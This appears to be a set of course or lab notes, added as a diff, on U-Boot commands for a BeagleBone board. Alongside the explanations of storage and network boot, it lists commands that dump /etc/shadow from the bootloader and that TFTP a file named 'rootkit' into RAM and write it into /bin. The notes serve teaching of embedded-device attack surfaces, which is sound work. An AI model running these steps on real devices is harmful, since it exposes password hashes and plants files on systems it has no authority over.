@@ -1,0 +1,105 @@
+printenv 	-> print environment variables
+bdinfo		-> board info
+
+mmc help	-> shows options for mmc (mmc is SDCard)
+mmc rescan	-> scan for mmc devices
+mmc list	-> show mmc devices
+mmc info	-> shows info of active mmc device
+mmc dev 1	-> sets active mmc to dev 1
+mmc part	-> shows list of partition on active mmc
+			0b is fat
+			83 is EXT4
+
+
+ls mmc 0:3 /etc	-> will do ls /etc directory
+  mmc  device (storage)
+  0:3  device 0 partition 3
+  /etc  /etc directory on storage device
+
+load mmc 0:3 $loadaddr /etc/shadow
+	load		load binary file from file system
+	mmc		  device (SDCard/storage)
+	0:3 		device 0 partition 3
+	$loadaddr	memory address to store information
+	/etc/shadow	linux shadow file
+
+md.b $loadaddr
+	md.b		memory display
+	.b = byte; .w = word; .l = long
+  $loadaddr memory address to retrieve information (shadow file from above)
+
+
+ls mmc 0:3 var	-> will automatically do an ls for any file system supported
+
+
+
+
+
+
+setenv ipaddr 192.168.1.50		or dhcp
+	setenv serverip <tftp server ip>
+	setenv autoload no
+	ping <tftp server ip>
+
+	bdinfo 			#to get the Start memory address (0x80000000)
+
+	tftpboot 0x80000000 rootkit		#copied rootkit into RAM
+		make note of the "Bytes Transferred" line:
+			Bytes Transferred = 20 (14 hex)" line
+
+	md.b 0x80000000		#will show you hex of file in Bytes
+
+	ls mmc 0:3 /bin		#device 0, partition 3, /bin directory
+
+	ext4write mmc 0:3 0x80000000 /bin/rootkit 14
+		0x80000000	location in memory file was stored
+		/bin/rootkit	location and name to write file to
+		14		Hex size of file acquired from above
+	
+	ls mmc 0:3 /bin		#rootkit file should show up
+
+	reset			#system will reboot into kernel. File should be in /bin
+
+
+In linux on Beaglebone:
+	cd /bin
+	ls
+	cat rootkit
+
+
+*************************************************************
+
+In Ubuntu:
+     On the VM copy the zImage and am335x-boneblack.dtb files to tftp server:
+     sudo cp ~/compile/Beaglebone_SDCard/kernel/am335x-boneblack.dtb /var/lib/tftpboot/
+     sudo cp ~/compile/Beaglebone_SDCard/kernel/zImage /var/lib/tftpboot/
+
+     sudo service tftpd-hpa start
+
+
+
+In U-Boot on SDCard:
+	setenv ipaddr 192.168.1.50	#IP of beaglebone
+	#setenv gatewayip 192.168.1.1	#Default Gateway, probably don't need this
+	setenv serverip 192.168.1.176	#IP of TFTP server/VM
+		ping a valid IP from beaglebone to ensure network is working
+
+	setenv autoload no		#do not autoboot U-Boot
+
+
+	printenv loadaddr		#load address for the kernel
+	printenv fdtaddr		#load address for the file device tree
+
+	Load linux kernel:
+		tftpboot $loadaddr zImage 
+
+		Think about what we are doing here and how you could blow up an IoT device
+
+		tftpboot $fdtaddr am335x-boneblack.dtb
+
+
+	Set boot arguments:
+		setenv bootargs "console=ttyO0,115200n8 root=/dev/mmcblk0p3 rw rootfstype=ext4 rootwait"
+
+	Boot up:
+		bootz $loadaddr - $fdtaddr
